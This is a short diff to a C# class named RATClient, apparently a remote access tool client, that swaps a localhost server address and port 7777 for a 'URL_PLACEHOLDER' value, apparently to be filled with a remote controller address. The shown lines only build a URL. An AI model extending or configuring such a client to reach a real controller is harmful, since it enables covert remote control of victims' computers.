@@ -166,12 +166,12 @@ class RATClient
 
     static string GetServerUrl()
     {
-        string ipAddress = "localhost";  // Default to local IP
+        string ipAddress = "URL_PLACEHOLDER";  // Default to local IP
         if (forwarded)  // Check if forwarded flag is set
         {
             ipAddress = GetLocalIPAddress();  // Dynamically get the local machine IP
         }
-        return $"http://{ipAddress}:7777";  // Return the dynamically built URL
+        return $"http://{ipAddress}";  // Return the dynamically built URL
     }
 
     static string GetLocalIPAddress()
